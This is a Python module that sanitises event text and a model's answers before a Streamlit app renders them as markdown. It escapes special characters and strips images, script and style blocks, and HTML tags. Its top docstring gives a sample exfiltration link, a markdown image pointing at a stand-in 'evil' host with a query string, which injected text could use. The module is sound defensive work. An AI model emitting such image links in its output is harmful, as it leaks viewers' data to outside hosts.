"""Neutralise third-party and model text before it is rendered as Streamlit markdown.

Markdown can load remote images (`![x](http://evil/?q=...)`), which would let injected text make
the viewer's browser call an arbitrary URL. Event names, source strings, event descriptions and
the model's own answer all come from outside this app, so they pass through here.
"""

from __future__ import annotations

import re

_MARKDOWN_SPECIALS = re.compile(r"([\\`*_\[\]()<>!#|~$])")
_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_SCRIPT_OR_STYLE = re.compile(r"<(script|style)\b.*?</\1\s*>", re.IGNORECASE | re.DOTALL)
_HTML_TAG = re.compile(r"</?[A-Za-z][^>]*>")


def escape_markdown(value) -> str:
    """Show `value` literally: links, images, emphasis and HTML lose their meaning.

    Each special character gets a backslash in front of it and is otherwise kept, so the text reads
    the same once rendered. (A function is used for the replacement on purpose: a template string
    like r"\\\1" is easy to get subtly wrong.)
    """
    if value is None:
        return ""
    return _MARKDOWN_SPECIALS.sub(lambda match: "\\" + match.group(1), str(value))


def sanitize_answer(text: str) -> str:
    """Model output keeps normal markdown (bold, lists, tables, plain links) but loses images and HTML."""
    text = _SCRIPT_OR_STYLE.sub("", text)
    text = _IMAGE.sub("", text)
    return _HTML_TAG.sub("", text)
